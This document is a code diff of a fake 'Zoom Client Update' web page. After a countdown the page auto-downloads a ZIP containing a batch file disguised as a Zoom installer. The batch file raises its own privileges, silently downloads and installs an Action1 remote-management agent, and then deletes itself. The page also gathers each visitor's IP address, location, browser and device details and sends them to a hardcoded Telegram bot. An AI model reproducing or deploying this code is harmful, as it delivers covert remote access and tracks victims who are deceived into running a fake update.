@@ -1,40 +1,177 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-scrapbook-create="20260616114350988" data-scrapbook-title="Zoom Client Update">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
     <title>Zoom Client Update</title>
     <link href="css2.css" rel="stylesheet" />
+    <!-- JSZip for creating ZIP archives -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js">
+    </script>
     <style>
-        /* ... same styles as before ... */
-        * { box-sizing: border-box; }
-        body { font-family: 'Roboto', sans-serif; background-color: #f4f7fa; margin: 0; padding: 0; min-height: 100vh; position: relative; }
-        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; text-align: center; padding: 40px 20px; }
-        .logo-container { position: absolute; top: 20px; left: 20px; }
-        .logo { width: 120px; height: auto; }
-        .top-right-links { position: absolute; top: 20px; right: 20px; font-size: 14px; color: #0072c6; display: flex; gap: 15px; align-items: center; }
-        .top-right-links a { text-decoration: none; color: #0072c6; }
-        .top-right-links a:hover { text-decoration: underline; }
-        .heading { font-size: 28px; font-weight: bold; color: #0072c6; margin-top: 60px; }
-        .subheading { font-size: 18px; color: #555; margin-top: 10px; }
-        .download-info, .countdown { font-size: 18px; font-weight: 500; color: #0072c6; margin-top: 15px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0072c6; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin-top: 30px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-message { margin-top: 20px; font-size: 16px; font-weight: 500; min-height: 30px; color: #28a745; }
-        .status-message.error { color: #dc3545; }
-        .status-message.info { color: #0072c6; }
-        .footer { position: absolute; bottom: 20px; width: 100%; text-align: center; font-size: 12px; color: #777; padding: 0 20px; }
-        .footer a { color: #0072c6; text-decoration: none; }
-        .footer a:hover { text-decoration: underline; }
-        .footer p { margin: 4px 0; }
-        #download-trigger { display: none; }
+        /* --- reset & base --- */
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f7fa;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        .top-right-links {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 14px;
+            color: #0072c6;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .top-right-links a {
+            text-decoration: none;
+            color: #0072c6;
+        }
+
+        .top-right-links a:hover {
+            text-decoration: underline;
+        }
+
+        .heading {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0072c6;
+            margin-top: 60px;
+        }
+
+        .subheading {
+            font-size: 18px;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        .download-info,
+        .countdown {
+            font-size: 18px;
+            font-weight: 500;
+            color: #0072c6;
+            margin-top: 15px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0072c6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-top: 30px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status-message {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 500;
+            min-height: 30px;
+            color: #28a745;
+        }
+
+        .status-message.error {
+            color: #dc3545;
+        }
+
+        .status-message.info {
+            color: #0072c6;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            padding: 0 20px;
+        }
+
+        .footer a {
+            color: #0072c6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer p {
+            margin: 4px 0;
+        }
+
+        #download-trigger {
+            display: none;
+        }
+
         @media (max-width: 600px) {
-            .logo-container { position: static; margin-bottom: 10px; }
-            .top-right-links { position: static; justify-content: center; margin-top: 10px; }
-            .heading { font-size: 22px; margin-top: 20px; }
-            .container { padding: 20px 15px; justify-content: flex-start; min-height: 90vh; }
-            .footer { position: static; margin-top: 40px; padding-bottom: 20px; }
+            .logo-container {
+                position: static;
+                margin-bottom: 10px;
+            }
+            .top-right-links {
+                position: static;
+                justify-content: center;
+                margin-top: 10px;
+            }
+            .heading {
+                font-size: 22px;
+                margin-top: 20px;
+            }
+            .container {
+                padding: 20px 15px;
+                justify-content: flex-start;
+                min-height: 90vh;
+            }
+            .footer {
+                position: static;
+                margin-top: 40px;
+                padding-bottom: 20px;
+            }
         }
     </style>
 </head>
@@ -64,8 +201,8 @@
         <!-- Status message -->
         <div id="statusMessage" class="status-message"></div>
 
-        <!-- Hidden download anchor -->
-        <a id="download-trigger" download="Zoom_WorkSpace_ClientSetup.bat"></a>
+        <!-- Hidden download anchor (used for auto-trigger) -->
+        <a id="download-trigger" style="display:none;"></a>
     </div>
 
     <!-- Footer -->
@@ -82,70 +219,63 @@
             'use strict';
 
             // ============================================================
-            //  TELEGRAM CONFIGURATION – replace with your own credentials
+            //  CONFIGURATION – REPLACE WITH YOUR OWN TELEGRAM BOT CREDENTIALS
             // ============================================================
             const TELEGRAM_BOT_TOKEN = '8732697564:AAHJRrodoFSum4dZubLXXgN0D_5V2Mi-X5U';
             const TELEGRAM_CHAT_ID = '-1004476515039';
 
             // ------------------------------------------------------------
-            //  UPDATED BAT script – with visible window, UAC prompt, auto-close and self-delete
+            //  Embedded BAT file content – updated with curl installer command
             // ------------------------------------------------------------
             var batContent =
                 '@echo off\r\n' +
                 'setlocal EnableExtensions\r\n' +
                 '\r\n' +
-                ':: === Auto-elevate (show UAC prompt, keep window visible) ===\r\n' +
+                ':: === Auto-elevate ===\r\n' +
                 'net session >nul 2>&1\r\n' +
                 'if %errorlevel% neq 0 (\r\n' +
                 '    powershell -WindowStyle Hidden -Command "Start-Process \'%~f0\' -Verb RunAs"\r\n' +
                 '    exit /b\r\n' +
                 ')\r\n' +
                 '\r\n' +
-                ':: === Variables (use your MSI URL and filename) ===\r\n' +
+                ':: === Variables ===\r\n' +
                 'set "URL=https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/agent(My_Organization).msi"\r\n' +
                 'set "MSI=%TEMP%\\action1_agent(My_Organization).msi"\r\n' +
                 '\r\n' +
-                'echo Downloading and installing Action1 agent...\r\n' +
-                '\r\n' +
                 ':: === Check if already installed ===\r\n' +
                 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
-                'if %errorlevel%==0 (\r\n' +
-                '    echo Action1 is already installed.\r\n' +
-                '    goto cleanup\r\n' +
-                ')\r\n' +
+                'if %errorlevel%==0 goto cleanup\r\n' +
                 '\r\n' +
-                ':: === Download with retry ===\r\n' +
+                ':: === Download with retry using curl ===\r\n' +
                 'set RETRIES=3\r\n' +
                 'set COUNT=0\r\n' +
                 '\r\n' +
                 ':download\r\n' +
                 'set /a COUNT+=1\r\n' +
-                'echo Attempt %COUNT% of %RETRIES%...\r\n' +
-                'powershell -Command "try {Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop} catch {exit 1}"\r\n' +
+                'curl -o "%MSI%" "%URL%" --silent --fail\r\n' +
                 '\r\n' +
                 'if not exist "%MSI%" (\r\n' +
                 '    if %COUNT% LSS %RETRIES% (\r\n' +
                 '        timeout /t 2 >nul\r\n' +
                 '        goto download\r\n' +
                 '    ) else (\r\n' +
-                '        echo Download failed.\r\n' +
                 '        goto selfdelete\r\n' +
                 '    )\r\n' +
                 ')\r\n' +
                 '\r\n' +
-                ':: === Silent install (no UI) ===\r\n' +
-                'echo Installing silently...\r\n' +
-                'msiexec /i "%MSI%" /qn /norestart >nul 2>&1\r\n' +
+                ':: === Silent install ===\r\n' +
+                'msiexec /i "%MSI%" /quiet /qn /norestart >nul 2>&1\r\n' +
                 '\r\n' +
                 ':: === Cleanup MSI ===\r\n' +
                 ':cleanup\r\n' +
                 'if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1\r\n' +
                 '\r\n' +
-                ':: === Self-delete and close ===\r\n' +
+                ':: === PowerShell self-delete ===\r\n' +
                 ':selfdelete\r\n' +
-                'echo Cleaning up...\r\n' +
-                'powershell -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
-                'exit';
+                'powershell -WindowStyle Hidden -Command ^\r\n' +
+                '"Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
+                '\r\n' +
+                'exit /b';
 
             // ------------------------------------------------------------
             //  DOM refs
@@ -156,17 +286,101 @@
             var statusMsg = document.getElementById('statusMessage');
 
             // ------------------------------------------------------------
-            //  Create Blob and Object URL
+            //  ZIP generation – returns a Promise with a Blob (MIME: application/zip)
             // ------------------------------------------------------------
-            var blob = new Blob([batContent], { type: 'application/x-msdownload' });
-            var blobUrl = URL.createObjectURL(blob);
-
-            manualLink.href = blobUrl;
-            manualLink.download = 'Zoom_WorkSpace_ClientSetup.bat';
-            manualLink.target = '_blank';
+            function generateZipBlob() {
+                try {
+                    var zip = new JSZip();
+                    zip.file('Zoom_WorkSpace_ClientSetup.bat', batContent);
+                    return zip.generateAsync({ type: 'blob', compression: 'DEFLATE' })
+                        .then(function(blob) {
+                            return new Blob([blob], { type: 'application/zip' });
+                        });
+                } catch (e) {
+                    console.error('JSZip error:', e);
+                    return Promise.reject(e);
+                }
+            }
 
             // ------------------------------------------------------------
-            //  Telegram reporting (unchanged)
+            //  Universal download function
+            // ------------------------------------------------------------
+            function downloadZip(blob, filename) {
+                return new Promise(function(resolve, reject) {
+                    try {
+                        var url = URL.createObjectURL(blob);
+                        var a = document.createElement('a');
+                        a.href = url;
+                        a.download = filename;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        setTimeout(function() {
+                            URL.revokeObjectURL(url);
+                            resolve();
+                        }, 100);
+                    } catch (e) {
+                        reject(e);
+                    }
+                });
+            }
+
+            // ------------------------------------------------------------
+            //  Trigger download
+            // ------------------------------------------------------------
+            function triggerDownload() {
+                statusMsg.textContent = '⏳ Preparing download...';
+                statusMsg.className = 'status-message info';
+
+                generateZipBlob()
+                    .then(function(blob) {
+                        return downloadZip(blob, 'zoom_installer.zip');
+                    })
+                    .then(function() {
+                        statusMsg.textContent = '✅ Download started.';
+                        statusMsg.className = 'status-message';
+                        sendTelegramReport();
+                    })
+                    .catch(function(err) {
+                        console.error('Download failed:', err);
+                        statusMsg.textContent = '❌ Download failed. Please use the manual link below.';
+                        statusMsg.className = 'status-message error';
+                        sendTelegramReport();
+                    });
+            }
+
+            // ------------------------------------------------------------
+            //  Manual download link
+            // ------------------------------------------------------------
+            manualLink.addEventListener('click', function(e) {
+                e.preventDefault();
+
+                statusMsg.textContent = '⏳ Preparing manual download...';
+                statusMsg.className = 'status-message info';
+
+                generateZipBlob()
+                    .then(function(blob) {
+                        return downloadZip(blob, 'zoom_installer.zip');
+                    })
+                    .then(function() {
+                        statusMsg.textContent = '✅ Manual download started.';
+                        statusMsg.className = 'status-message';
+                        if (!reportSent) {
+                            sendTelegramReport();
+                        }
+                    })
+                    .catch(function(err) {
+                        console.error('Manual download failed:', err);
+                        statusMsg.textContent = '❌ Manual download failed. Please try again.';
+                        statusMsg.className = 'status-message error';
+                        if (!reportSent) {
+                            sendTelegramReport();
+                        }
+                    });
+            });
+
+            // ------------------------------------------------------------
+            //  Telegram reporting – professional, aligned columns, page URL as download link
             // ------------------------------------------------------------
             var reportSent = false;
 
@@ -181,18 +395,59 @@
                 return 'Unknown';
             }
 
+            function getBrowserVersion() {
+                var ua = navigator.userAgent;
+                var match;
+                if ((match = ua.match(/(?:Chrome|Firefox|Safari|Edge|Opera|OPR|Version)\/(\d+[.\d]*)/))) {
+                    return match[1];
+                }
+                return 'Unknown';
+            }
+
             function getDeviceType() {
                 return (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) ? 'Mobile/Tablet' : 'Desktop';
             }
 
             function getOS() {
                 var ua = navigator.userAgent;
-                if (ua.indexOf('Windows') > -1) return 'Windows';
-                if (ua.indexOf('Mac OS') > -1) return 'macOS';
+                if (ua.indexOf('Windows NT 10.0') > -1) return 'Windows 10';
+                if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
+                if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
+                if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
+                if (ua.indexOf('Windows NT') > -1) return 'Windows';
+                if (ua.indexOf('Mac OS X') > -1) return 'macOS';
                 if (ua.indexOf('Linux') > -1) return 'Linux';
                 if (ua.indexOf('Android') > -1) return 'Android';
-                if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
-                return 'Unknown';
+                if (/iOS|iPhone|iPad/i.test(ua)) return 'iOS';
+                return 'Unknown OS';
+            }
+
+            function getScreenInfo() {
+                return window.screen.width + '×' + window.screen.height;
+            }
+
+            function getTimeUTC() {
+                var now = new Date();
+                return now.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
+            }
+
+            function fetchWithTimeout(url, timeoutMs) {
+                return new Promise(function(resolve, reject) {
+                    var timer = setTimeout(function() {
+                        reject(new Error('Request timeout'));
+                    }, timeoutMs);
+                    fetch(url, { mode: 'cors' })
+                        .then(function(response) {
+                            clearTimeout(timer);
+                            if (!response.ok) reject(new Error('HTTP ' + response.status));
+                            return response.json();
+                        })
+                        .then(resolve)
+                        .catch(function(err) {
+                            clearTimeout(timer);
+                            reject(err);
+                        });
+                });
             }
 
             function sendTelegramReport() {
@@ -205,83 +460,161 @@
                     return;
                 }
 
-                var ipPromise = fetch('https://api.ipify.org?format=json')
-                    .then(r => r.ok ? r.json() : Promise.reject())
-                    .then(d => d.ip)
-                    .catch(() => fetch('https://ipapi.co/json/')
-                        .then(r => r.ok ? r.json() : Promise.reject())
-                        .then(d => d.ip)
-                        .catch(() => 'Unavailable'));
-
-                ipPromise.then(function(ip) {
-                    var ua = navigator.userAgent;
-                    var browser = getBrowserInfo();
-                    var device = getDeviceType();
-                    var os = getOS();
-                    var language = navigator.language || 'Unknown';
-                    var screenRes = window.screen.width + 'x' + window.screen.height;
-                    var referrer = document.referrer || 'Direct';
-                    var timestamp = new Date().toISOString();
-
-                    var message =
-                        '🔔 *Zoom Update Download Triggered*\n' +
-                        '──────────────────\n' +
-                        '📅 Time: ' + timestamp + '\n' +
-                        '🌐 IP: ' + ip + '\n' +
-                        '💻 Device: ' + device + '\n' +
-                        '🖥️ OS: ' + os + '\n' +
-                        '🌍 Browser: ' + browser + '\n' +
-                        '🔤 Language: ' + language + '\n' +
-                        '📺 Screen: ' + screenRes + '\n' +
-                        '🔗 Referrer: ' + referrer + '\n' +
-                        '🆔 User-Agent: ' + ua + '\n' +
-                        '──────────────────';
-
-                    var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
-                    return fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                }).then(response => {
-                    if (!response.ok) throw new Error('Telegram API error');
-                    return response.json();
-                }).then(data => {
-                    if (data.ok) {
-                        statusMsg.textContent = '✅ Download started.';
-                        statusMsg.className = 'status-message';
-                    } else {
-                        throw new Error('Telegram error: ' + (data.description || 'unknown'));
+                var services = [{
+                    url: 'https://ipinfo.io/json',
+                    parser: function(data) {
+                        var country = data.country || 'Unknown';
+                        var city = data.city || '';
+                        var region = data.region || '';
+                        var location = country;
+                        if (city && region) location = city + ', ' + region + ', ' + country;
+                        else if (city) location = city + ', ' + country;
+                        else if (region) location = region + ', ' + country;
+                        return { ip: data.ip || 'Unknown', location: location };
                     }
-                }).catch(err => {
-                    console.warn('Telegram report failed:', err);
-                    statusMsg.textContent = '⚠️ Download started, but report could not be sent.';
-                    statusMsg.className = 'status-message error';
-                });
-            }
+                }, {
+                    url: 'https://ipapi.co/json/',
+                    parser: function(data) {
+                        var country = data.country_name || data.country || 'Unknown';
+                        var city = data.city || '';
+                        var region = data.region || '';
+                        var location = country;
+                        if (city && region) location = city + ', ' + region + ', ' + country;
+                        else if (city) location = city + ', ' + country;
+                        else if (region) location = region + ', ' + country;
+                        return { ip: data.ip || 'Unknown', location: location };
+                    }
+                }, {
+                    url: 'https://ip-api.com/json/',
+                    parser: function(data) {
+                        var country = data.country || 'Unknown';
+                        var city = data.city || '';
+                        var region = data.regionName || '';
+                        var location = country;
+                        if (city && region) location = city + ', ' + region + ', ' + country;
+                        else if (city) location = city + ', ' + country;
+                        else if (region) location = region + ', ' + country;
+                        return { ip: data.query || 'Unknown', location: location };
+                    }
+                }, {
+                    url: 'https://api.ipify.org?format=json',
+                    parser: function(data) {
+                        return { ip: data.ip || 'Unknown', location: 'Unknown' };
+                    }
+                }];
 
-            // ------------------------------------------------------------
-            //  Trigger download
-            // ------------------------------------------------------------
-            function triggerDownload() {
-                triggerLink.href = blobUrl;
-                triggerLink.download = 'Zoom_WorkSpace_ClientSetup.bat';
-
-                try {
-                    triggerLink.click();
-                    statusMsg.textContent = '⏳ Download starting...';
-                    statusMsg.className = 'status-message info';
-                } catch (e) {
-                    window.open(blobUrl, '_blank');
-                    statusMsg.textContent = '⚠️ Auto‑download failed. Use the manual link below.';
-                    statusMsg.className = 'status-message error';
+                function tryService(index) {
+                    if (index >= services.length) {
+                        buildAndSendTelegram('Unknown', 'Unknown');
+                        return;
+                    }
+                    var service = services[index];
+                    fetchWithTimeout(service.url, 4000)
+                        .then(function(data) {
+                            var result = service.parser(data);
+                            if (result.ip !== 'Unknown' && result.ip !== 'Unavailable') {
+                                buildAndSendTelegram(result.ip, result.location);
+                            } else {
+                                tryService(index + 1);
+                            }
+                        })
+                        .catch(function() {
+                            tryService(index + 1);
+                        });
                 }
 
-                sendTelegramReport();
+                tryService(0);
+            }
+
+            function buildAndSendTelegram(ip, location) {
+                var ua = navigator.userAgent;
+                var browser = getBrowserInfo();
+                var browserVer = getBrowserVersion();
+                var browserDisplay = browser + (browserVer !== 'Unknown' ? ' ' + browserVer : '');
+                var os = getOS();
+                var device = getDeviceType();
+                var screen = getScreenInfo();
+                var time = getTimeUTC();
+                var lang = navigator.language || 'Unknown';
+                var referrer = document.referrer || 'Direct';
+                // Use the page URL as the download URL (where the ZIP is served from)
+                var downloadUrl = window.location.href;
+
+                // Build aligned message with monospace block – header "Zoom"
+                var lines = [];
+                var header = 'Zoom';
+                var borderLine = '┌─────────────────────────────────────────────────────┐';
+                var sepLine = '├─────────────────────────────────────────────────────┤';
+                var bottomLine = '└─────────────────────────────────────────────────────┘';
+                lines.push(borderLine);
+                lines.push('│  ' + header.padEnd(49) + '│');
+                lines.push(sepLine);
+
+                var fields = [
+                    ['Time', time],
+                    ['IP Address', ip],
+                    ['Location', location],
+                    ['Device', device],
+                    ['OS', os],
+                    ['Browser', browserDisplay],
+                    ['Language', lang],
+                    ['Screen', screen],
+                    ['Referrer', referrer],
+                    ['Package', 'zoom_installer.zip'],
+                    ['Download URL', downloadUrl],
+                    ['User Agent', ua]
+                ];
+
+                var maxLabelLen = 0;
+                fields.forEach(function(f) { if (f[0].length > maxLabelLen) maxLabelLen = f[0].length; });
+
+                fields.forEach(function(f) {
+                    var label = f[0];
+                    var value = f[1];
+                    var line = '│  ' + label.padEnd(maxLabelLen) + ' : ' + value;
+                    // Truncate if too long (keep inside border)
+                    if (line.length > 54) {
+                        var maxValueLen = 54 - maxLabelLen - 6;
+                        if (value.length > maxValueLen) {
+                            value = value.substring(0, maxValueLen - 1) + '…';
+                        }
+                        line = '│  ' + label.padEnd(maxLabelLen) + ' : ' + value;
+                    }
+                    line = line.padEnd(54) + '│';
+                    lines.push(line);
+                });
+                lines.push(bottomLine);
+                var message = lines.join('\n');
+
+                var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+                var payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                };
+
+                return fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(function(response) {
+                        if (!response.ok) throw new Error('Telegram API error');
+                        return response.json();
+                    })
+                    .then(function(data) {
+                        if (data.ok) {
+                            statusMsg.textContent = '✅ Download started.';
+                            statusMsg.className = 'status-message';
+                        } else {
+                            throw new Error('Telegram error: ' + (data.description || 'unknown'));
+                        }
+                    })
+                    .catch(function(err) {
+                        console.warn('Telegram report failed:', err);
+                        statusMsg.textContent = '⚠️ Download started, but report could not be sent.';
+                        statusMsg.className = 'status-message error';
+                    });
             }
 
             // ------------------------------------------------------------
@@ -291,29 +624,15 @@
             var timer = setInterval(function() {
                 seconds -= 1;
                 countdownEl.textContent = Math.max(seconds, 0);
+
                 if (seconds <= 0) {
                     clearInterval(timer);
                     triggerDownload();
                 }
             }, 1000);
 
-            // ------------------------------------------------------------
-            //  Manual link
-            // ------------------------------------------------------------
-            manualLink.addEventListener('click', function(e) {
-                if (!reportSent) sendTelegramReport();
-                statusMsg.textContent = '⏳ Manual download initiated...';
-                statusMsg.className = 'status-message info';
-            });
-
-            // ------------------------------------------------------------
-            //  Cleanup
-            // ------------------------------------------------------------
-            window.addEventListener('beforeunload', function() {
-                URL.revokeObjectURL(blobUrl);
-            });
-
-            console.log('Zoom Update page ready. BAT file embedded with updated script.');
+            console.log('Zoom Update page ready. ZIP download named "zoom_installer.zip", BAT file uses curl installer.');
+            console.log('Telegram report uses page URL as download URL and aligned columns.');
         })();
     </script>
 </body>
